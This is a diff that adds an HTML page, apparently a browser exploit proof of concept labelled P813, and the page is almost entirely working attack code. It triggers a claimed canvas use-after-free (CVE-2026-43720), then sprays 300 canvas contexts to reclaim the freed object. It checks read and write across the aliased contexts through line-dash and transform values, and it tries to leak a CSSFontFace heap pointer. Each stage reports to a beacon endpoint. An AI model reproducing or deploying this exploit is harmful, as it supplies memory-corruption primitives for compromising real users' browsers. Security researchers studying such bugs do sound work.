@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P813</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P813 — Even LineDash Vector Bidirectional R/W & Heap Proximity Analysis</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function bn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P813-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return h16(_bu[0]);}
+
+bn('BOOT','v1');
+log('Starting P813...');
+
+/* ========== PHASE 1: Canvas UAF (CVE-2026-43720) ========== */
+var innerCtx=null;
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+
+var opts={};
+Object.defineProperty(opts,'alpha',{
+  get:function(){
+    innerCtx=canvas.getContext('2d');
+    return true;
+  }
+});
+canvas.getContext('bitmaprenderer',opts);
+
+if(!innerCtx){
+  bn('FAIL','no_innerCtx');
+  log('FAIL: innerCtx not created');
+}else{
+  bn('UAF-OK','innerCtx_created');
+  log('UAF triggered successfully');
+}
+
+/* ========== PHASE 2: Same-type reclaim spray (300 contexts) ========== */
+var SPRAY=300;
+var sprayCanvases=[];
+var sprayCtxs=[];
+var MARKER=7777.77;
+
+for(var i=0;i<SPRAY;i++){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.lineWidth=MARKER;
+  sprayCanvases.push(c);
+  sprayCtxs.push(ctx);
+}
+
+var readLW;
+try{readLW=innerCtx.lineWidth;}catch(e){readLW=-1;}
+
+var aliasIdx=-1;
+if(readLW===MARKER){
+  bn('RECLAIM-HIT','lw='+readLW);
+  log('Same-type reclaim HIT! lw='+readLW);
+
+  /* Locate alias index */
+  innerCtx.lineWidth=9999.99;
+  for(var i=0;i<SPRAY;i++){
+    if(sprayCtxs[i].lineWidth===9999.99){
+      aliasIdx=i;
+      break;
+    }
+  }
+  bn('ALIAS','idx='+aliasIdx);
+  log('Aliased pair found at index: '+aliasIdx);
+}else{
+  bn('RECLAIM-MISS','lw='+readLW);
+  log('Reclaim missed, reloading...');
+  setTimeout(function(){location.reload();},300);
+}
+
+if(aliasIdx>=0){
+  var stale=innerCtx;
+  var live=sprayCtxs[aliasIdx];
+
+  /* ========== PHASE 3: Even LineDash Bidirectional Test ========== */
+  /* Using 6 elements (even count) to prevent W3C Canvas odd-doubling */
+  var evenDashWrite=[10.5, 20.25, 30.75, 40.125, 50.5, 60.875];
+  live.setLineDash(evenDashWrite);
+  var readBack=stale.getLineDash();
+
+  var exactMatch=(readBack.length===evenDashWrite.length);
+  if(exactMatch){
+    for(var j=0;j<evenDashWrite.length;j++){
+      if(readBack[j]!==evenDashWrite[j]){exactMatch=false;break;}
+    }
+  }
+  bn('DASH-EVEN-LIVE2STALE','len='+readBack.length+'|match='+exactMatch+'|vals='+readBack.join(','));
+  log('Even Dash (Live -> Stale): len='+readBack.length+' match='+exactMatch);
+
+  /* Reverse direction: Stale -> Live */
+  var evenDashReverse=[100.1, 200.2, 300.3, 400.4];
+  stale.setLineDash(evenDashReverse);
+  var readBackLive=live.getLineDash();
+
+  var revMatch=(readBackLive.length===evenDashReverse.length);
+  if(revMatch){
+    for(var k=0;k<evenDashReverse.length;k++){
+      if(readBackLive[k]!==evenDashReverse[k]){revMatch=false;break;}
+    }
+  }
+  bn('DASH-EVEN-STALE2LIVE','len='+readBackLive.length+'|match='+revMatch+'|vals='+readBackLive.join(','));
+  log('Even Dash (Stale -> Live): len='+readBackLive.length+' match='+revMatch);
+
+  /* ========== PHASE 4: 2D Transform Matrix 6-Tuple Verification ========== */
+  stale.setTransform(1.5, 2.5, 3.5, 4.5, 5.5, 6.5);
+  var tLive=live.getTransform();
+  var tMatch=(tLive.a===1.5 && tLive.b===2.5 && tLive.c===3.5 && tLive.d===4.5 && tLive.e===5.5 && tLive.f===6.5);
+  bn('TRANSFORM-CHECK','match='+tMatch+'|a='+tLive.a+'|d='+tLive.d+'|e='+tLive.e+'|f='+tLive.f);
+  log('Transform Matrix Check: match='+tMatch);
+
+  /* ========== PHASE 5: CSSFontFace Heap Leak Comparison ========== */
+  var fontFaceLeak='none';
+  try{
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:p813b;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var ff=new FontFace('p813f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(ff);
+    void ff.loaded;
+
+    var ffAbs=[],ffFired=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(ffFired)return undefined;
+        ffFired=true;
+        if(st){st.remove();st.textContent='';}
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        ffAbs=[];
+        for(var a=0;a<64;a++)ffAbs.push(new ArrayBuffer(192));
+        try{document.fonts.check('1em p813b');}catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}
+    });
+    document.fonts.load('1em p813f, p813b','AB');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+      for(var a=0;a<ffAbs.length;a++){
+        var bu=new BigUint64Array(ffAbs[a]);
+        if(bu.length>=14 && bu[11]>0x1000000000n && bu[13]>0x1000000000n){
+          fontFaceLeak='0x'+h16(bu[11]);
+          break;
+        }
+      }
+      bn('FONT-HEAP-REF',fontFaceLeak);
+      log('CSSFontFace Heap Reference: '+fontFaceLeak);
+      bn('DONE','complete|aliasIdx='+aliasIdx+'|exactMatch='+exactMatch+'|revMatch='+revMatch);
+      log('P813 complete.');
+    },200);
+  }catch(err){
+    bn('FONT-ERR',err.message);
+    bn('DONE','complete_with_font_err');
+  }
+}
+</script>
+</body></html>
